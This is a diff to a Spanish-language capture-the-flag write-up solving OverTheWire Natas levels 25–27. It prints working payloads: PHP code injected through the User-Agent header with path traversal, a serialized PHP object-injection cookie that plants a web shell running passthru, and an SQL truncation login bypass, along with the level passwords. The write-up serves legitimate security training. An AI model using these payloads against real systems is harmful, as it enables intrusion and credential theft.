@@ -1,4 +1,4 @@
-# natas0
+d natas0
 
 http://natas0.natas.labs.overthewire.org
 natas0
@@ -467,8 +467,68 @@ Por una parte tenemos un fichero en el que se escribe el HTTP_USER_AGENT (y, por
 * Mostrar el log
 
 De un tirón y sin más explicación:
+
 `curl -q --cookie "PHPSESSID=ojoooooo" -H "User-agent: <?php echo file_get_contents('/etc/natas_webpass/natas26'); php?>" -u natas25:GHF6X7YwACaYYssHVY05cFq83hRktl4c "http://natas25.natas.labs.overthewire.org?lang=..././..././..././..././..././tmp/natas25_ojoooooo.log`
 
 Entr los errores tenemos la cadena buscada: oGgWAJ7zcGT28vYazGo4rkhOPDhBu34T
 
 # natas26
+
+A primera vista parece que se puede inyectar "algo" en el log. Es decir, algo semejante al caso anterior aunque algo más complejo. Investigando un poco llego a https://www.owasp.org/index.php/PHP_Object_Injection, una vulnerabilidad de aplicación que aprovecha un "magic method" de PHP (en este caso destruct) y el uso de unserialize() con sanitización insuficiente.
+
+Vamos a crear un objeto Logger para inyectar; así que reescribimos la clase "tuneada" (fichero objInjection.php).
+
+```
+php objInjection.php
+Tzo2OiJMb2dnZXIiOjM6e3M6MTU6IgBMb2dnZXIAbG9nRmlsZSI7czoxMzoiaW1nL3B3bmVkLnBocCI7czoxNToiAExvZ2dlcgBpbml0TXNnIjtzOjE2OiIjLS1iZWVuIGhlcmUtLSMKIjtzOjE1OiIATG9nZ2VyAGV4aXRNc2ciO3M6NTI6Ijw%2FcGhwIHBhc3N0aHJ1KCdjYXQgL2V0Yy9uYXRhc193ZWJwYXNzL25hdGFzMjcnKTsgPz4iO30%3D
+```
+
+Cogemos el resultado y lo metemos en la cookie:
+
+```
+curl --cookie "drawing=Tzo2OiJMb2dnZXIiOjM6e3M6MTU6IgBMb2dnZXIAbG9nRmlsZSI7czoxMzoiaW1nL3B3bmVkLnBocCI7czoxNToiAExvZ2dlcgBpbml0TXNnIjtzOjE2OiIjLS1iZWVuIGhlcmUtLSMKIjtzOjE1OiIATG9nZ2VyAGV4aXRNc2ciO3M6NTI6Ijw%2FcGhwIHBhc3N0aHJ1KCdjYXQgL2V0Yy9uYXRhc193ZWJwYXNzL25hdGFzMjcnKTsgPz4iO30%3D" -u natas26:oGgWAJ7zcGT28vYazGo4rkhOPDhBu34T 'http://natas26.natas.labs.overthewire.org'
+<html>
+<head>
+<!-- This stuff in the header ...
+
+[...]
+
+</form>
+
+<img src="img/natas26_bgumej6psqrg1hft5j7uopq8u0.png"><br />
+<b>Fatal error</b>:  Cannot use object of type Logger as array in <b>/var/www/natas/natas26/index.php</b> on line <b>105</b><br />
+```
+
+Vamos a ver si el fichero img/pwned.php está en su sitio (me ha costado varios intentos :)
+
+```
+curl -u natas26:oGgWAJ7zcGT28vYazGo4rkhOPDhBu34T 'http://natas26.natas.labs.overthewire.org/img/pwned.php'
+#--session end--#
+#--session end--#
+#--session end--#
+#--session end--#
+#--been here--#
+55TBjpPZUUJgVP5b3BnbG6ON9uDPVzCJ
+```
+
+# natas27
+
+Otro que he tenido que mirar la "chuleta". Aparentemene podría ser una inyección SQL... pero no. Sin embargo, hay un problema de validación de datos insuficiente, aunque menos aparente.
+
+La creación de la tabla se hace con un tipo "varchar(64)". Sin embargo, no se comprueban límites en la entrada.
+
+Por otra parte, la función **dumpData** -candidata obvia a ser *abusada*- devuelve usuario y contraseña de todos los usuarios de nombre username. Vamos ,que puede haber más de uno.
+
+Pues nos saltamos el control dando de alta el siguiente usuario:
+
+"natas28                                                         a"
+
+Si no me equivoco, ahí hay 65 caracteres; pero solo 64 se almacenan en la base de datos (no entra la "a" del final). Una vez creado, entramos en el formulario con el usuario "natas28" y la contraseña que hemos puesto; el sistema nos dará acceso, puesto que "eliminará" los 57 espacios finales en la comparación y proporcionará la contraseña real de natas28:
+
+```
+Welcome natas28!
+Here is your data:
+Array ( [username] => natas28 [password] => JWwR438wkgTsNKBbcJoowyysdM82YjeF )
+```
+
+# natas29
